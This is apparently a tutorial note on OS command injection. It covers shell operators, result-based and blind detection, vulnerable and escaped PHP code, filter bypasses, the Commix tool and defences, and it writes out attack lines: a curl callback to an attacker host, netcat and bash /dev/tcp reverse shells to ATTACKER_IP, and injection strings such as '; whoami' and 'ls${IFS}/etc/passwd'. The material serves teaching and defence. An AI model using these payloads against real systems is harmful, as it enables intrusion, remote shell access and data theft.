# 17 - Command Injection

## Introduction
- Command Injection is a vulnerability that lets attackers execute arbitrary OS commands via an application that incorrectly forwards untrusted input to a shell or command API. Exploits can lead to remote code execution, data theft, privilege escalation or denial-of-service.

## How it works (summary)
- Attacker finds a user-controllable input used in a system command (form field, URL parameter, header).
- They inject a crafted payload (command separators, subshells, backticks) so the application runs the attacker's commands.
- Outcomes: immediate output (result-based), inferred execution (blind), or external callbacks (OOB).

## Effects
- Remote code execution / shell access.
- Privilege escalation (if service runs with high privileges).
- Data exfiltration (files, credentials), system disruption, persistence.

## Key concepts
- Shell: command interpreter used by the OS (bash, sh, powershell, cmd.exe).
- Bind shell: target listens and attacker connects.
- Reverse shell: target connects back to attacker (common in exploitation).
- Payload: malicious command(s) run on the OS.
- Input validation/sanitization, whitelisting vs. blacklisting, sandboxing and escapeshellarg() are defensive concepts.

## Shell basics & common commands
- Linux examples: whoami, hostname, id, uname, ls, pwd, cat, find, grep, curl, wget, chmod, chown, nc, bash, sleep.
- Windows examples: whoami, hostname, ipconfig, dir, type, net user, systeminfo, powershell.

## Shell operators (common separators & control)
- `;` — sequential commands
- `&&` — run second if first succeeds
- `||` — run second if first fails
- `|` — pipe output to another command
- `>`, `>>` — redirect output
- `` ` ``, `$()` — command substitution
- `&` — background execution

## Result-based vs Blind Command Injection
- Result-based: attacker sees output in response (easier to confirm / exploit).
- Blind: output not returned; attacker infers execution via timing (sleep) or side-effects (DNS/HTTP callback).

## Detection examples (from source)
- Example: vulnerable DNS lookup using `nslookup $user_input`. Payloads: `; whoami`, `| whoami`, `&& whoami` confirm execution by observing returned output.
- Blind detection: inject `; sleep 10` into a header (e.g., User-Agent). If response is delayed ~10s, injection is confirmed.

## Vulnerable code patterns & secure fixes (PHP examples)
- Vulnerable:
```php
if (isset($_POST['query'])) {
	$query = $_POST['query'];
	$command = "nslookup $query"; // vulnerable
	exec($command, $output);
	// output rendered directly
}
```

- Safer (use argument escaping):
```php
if (isset($_POST['query'])) {
	$query = $_POST['query'];
	$safe_query = escapeshellarg($query);
	$command = "nslookup $safe_query";
	exec($command, $output);
}
```

- When possible avoid calling the shell entirely: use native library APIs instead of `exec`/`shell_exec`.

## Blind Command Injection techniques
- Time-based: `; sleep 10` or platform equivalent — detect via response delay.
- OOB detection: cause the target to make DNS/HTTP requests to attacker-controlled host (e.g., `; curl http://attacker/`), then monitor the listener.

## Reverse shells (overview)
- Reverse shell: target runs a command to connect back to attacker listener (common payloads shown in source). Example using netcat:
	- Listener: `nc -lvp 4444`
	- Payload: `; nc -e /bin/bash ATTACKER_IP 4444`
- Alternative payloads: bash TCP redirect (`bash -i >& /dev/tcp/IP/PORT 0>&1`), Python, PHP, Perl, Ruby, PowerShell variations (source includes examples). Replace IP/PORT with your listener.
- Ethical note: only test in authorized environments.

## Generating reverse shells
- Use payload generators (e.g., revshells) or templates; always adapt to available interpreters on target (nc, bash, python, php).

## Bypass techniques (summary from source)
1. Removing or replacing spaces: use `${IFS}` or other env separators: `ls${IFS}/etc/passwd`.
2. Breaking keywords with quotes or concatenation: `w'h'o'am'i` or `w"h"o"am"i`.
3. Subshells/backticks: ``who`echo am`i`` or `who$(echo am)i`.
4. Using alternative separators or chaining operators if spaces are filtered (`;`, `&&`, `||`, `|`).

## Tools for scanning/exploitation
- Commix — automated command-injection discovery & exploitation tool (https://github.com/commixproject/commix). Features: classic/blind/OOB, tampering, payload encoding.
- Basic Commix usage: `git clone https://github.com/commixproject/commix.git && python commix.py --url="http://target"` (see tool docs).

## Defensive recommendations
- Avoid launching shells with user input. Use native APIs or libraries instead.
- Use strong input validation and prefer whitelisting (allowed patterns) over blacklisting.
- Escape shell arguments reliably (e.g., `escapeshellarg()` in PHP) when shelling is unavoidable.
- Run services with least privilege and use sandboxing or containerization to reduce blast radius.
- Log and monitor abnormal system calls, outbound requests and unusual response-time patterns.
- Restrict available binaries and disable common network tools where not needed (nc, wget, curl), when feasible.

#
